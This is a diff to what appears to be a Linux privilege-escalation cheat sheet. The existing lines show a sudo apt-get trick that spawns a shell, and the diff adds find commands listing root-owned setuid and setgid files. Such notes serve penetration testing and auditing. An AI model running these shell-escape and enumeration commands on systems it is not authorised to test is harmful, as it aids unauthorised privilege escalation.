@@ -345,3 +345,17 @@ apt-get can be used to break out of restricted environments and spawn a shell by
 ```JavaScript
 sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
+
+**List Files with setuid Set**
+
+```JavaScript
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+
+**List Files with setgid Set**
+
+```JavaScript
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+```
+
